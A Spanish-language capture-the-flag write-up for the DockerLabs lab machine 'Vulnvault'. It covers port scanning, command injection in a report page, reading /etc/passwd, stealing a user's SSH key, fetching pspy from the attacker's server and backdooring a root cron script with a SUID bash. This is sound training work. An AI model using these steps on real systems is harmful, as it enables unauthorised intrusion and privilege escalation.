# 💻 Maquina vulnvault

![](https://darkened-raisin-b9c.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F89ee8e04-ef1a-4e1f-bd35-dd38f517fa16%2Fc4957249-01b5-4771-b9fd-39af9f612f5f%2Fimage.png?table=block\&id=1045f89f-9238-8098-b0d9-fcf67ccf3aba\&spaceId=89ee8e04-ef1a-4e1f-bd35-dd38f517fa16\&width=2000\&userId=\&cache=v2)

* **Nombre de la Máquina:** Vulnvault
* **Sistema Operativo:** Linux
* **Dificultad:** Fácil
* **Plataforma:** [DockerLabs](https://dockerlabs.es/)
* **Dirección IP:** 172.17.0.2

### Escaneo de puertos <a href="#heading-escaneo-de-puertos" id="heading-escaneo-de-puertos"></a>

Empezamos escaneando los puertos disponibles en la maquina:

```shell
sudo nmap -sS -p- --open -T5 -n -Pn -v 172.17.0.2 -oG allports
```

Obtenemos los siguientes puertos abiertos :

```sh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 14:43 -05
Initiating ARP Ping Scan at 14:43
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 14:43, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:43
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 14:43, 0.52s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

En el resultado que nos arroja vemos que tenemos los puertos 22,80 por lo tanto realizamos un análisis mas detallado para ver que servicios están corriendo por estos:

```sh
> nmap -sCV -p22,80 172.17.0.2 -oG Puertos
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 14:47 -05
Nmap scan report for vulnvault.dl (172.17.0.2)
Host is up (0.000027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Generador de Reportes - Centro de Operaciones
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
```

Ingresamos ala pagina web que tenemos corriendo por el puerto 80 para ver que tenemos:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727725843588/a83fab31-5f1f-4a4c-a45d-2b9b124b7a2d.png?auto=compress,format\&format=webp)

En la pagina vemos un enlace donde podemos subir archivos, aproveche para ejecutar una reverse Shell para saber si era posible un tipo de conexión pero no fue así.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727725974505/e4cd8ebb-0b19-4e24-976a-ca66d52b3bed.png?auto=compress,format\&format=webp)

Después de inspeccionar el código de fuente de la pagina revise la primer pagina “Generar Reportes” para ver si lograba alguna respuesta, ya que en la pantalla me imprimía cierta información.

### Intrusión <a href="#heading-intrusion" id="heading-intrusion"></a>

Nos dimos de cuenta que nos corre comandos anteponiendo ;

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727726532948/cd3e2a8d-fd03-467f-986d-4e934c545ee6.png?auto=compress,format\&format=webp)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727726511534/134f957f-cd97-43ad-bc34-091490dfd31d.png?auto=compress,format\&format=webp)

Por lo tanto procedo a leer el archivo `/etc/passwd` para ver que usuarios encontramos.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727726709728/478cad3e-d49d-4396-a0f8-e5e43e9bd841.png?auto=compress,format\&format=webp)

Encontramos una usuaria `samara`, trate por medio de Hydra lograr descifrar alguna contraseña pero no fue posible, por eso intente buscar la cave privada del ssh del usuario samara, y efectivamente la encontramos..

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727726878350/408f3d88-239a-4ff5-9e34-55e73cd70ef5.png?auto=compress,format\&format=webp)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727726907483/25693de4-a16b-41bc-9ca2-c4798b9b9877.png?auto=compress,format\&format=webp)

Procedemos a copiarla y crear un archivo en nuestro directorio para asi darle permisos y poder loguearnos por ssh

```
nano id_rsa
chmod 600 id_rsa
ssh samara@172.17.0.2 -i id_rsa
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727727121235/33a5bbf0-615d-4d1c-9247-f2b56a3da2cb.png?auto=compress,format\&format=webp)

### Escalada de Privilegios <a href="#heading-escalada-de-privilegios" id="heading-escalada-de-privilegios"></a>

Empezamos por revisar los archivos del escritorio pero no hay nada relevante.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727727536190/a8dc7d7a-3c71-4324-a79c-d637615c277d.png?auto=compress,format\&format=webp)

Vamos a continuar revisando como escalar privilegios:

* Permisos SUID
* Privilegios Sudoers
* Tareas Cron

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727727789720/dadb41aa-2cde-4b03-93fa-877cc8a96896.png?auto=compress,format\&format=webp)

Al ver que no hay nada relevante procedo a descargar pspy64 y transferirlo la maquina con esto ver que podemos encontrar.

Desde mi maquina.

```shell-session
> python3 -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
```

Maquina Victima, una vez recibimos el script le damos privilegios y ejecutamos.

```shell
wget http://194.168.145.145:443/pspy64
--2024-09-30 22:29:31--  http://192.168.153.145:443/pspy64
Connecting to 192.168.153.145:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64        100%   2.96M  17.4MB/s    in 0.2s     

2024-09-30 22:29:31 (17.4 MB/s) - ‘pspy64’ saved [3104768/3104768]

chmod 600 pspy64
./pspy64
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727728528391/69087613-ae3d-43ff-ac2d-4cf0eab94fe9.png?auto=compress,format\&format=webp)

Encontramos que se esta ejecutando constantemente el archivo `/usr/local/bin/echo.sh.`

Ingresamos al directorio y vemos que tiene permisos de escritura por lo que lo editamos para poder escalar privilegios

```sh
nano /usr/local/bin/echo.sh
#!/bin/bash
chmod u+s /usr/bin/bash
```

Una vez modificamos y guardamos ejecutamos el comando `bash -p` obtendremos una bash privilegiada con permisos root.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1727728859372/0539b8cf-d840-4275-a9eb-d8fc03c450c2.png?auto=compress,format\&format=webp)
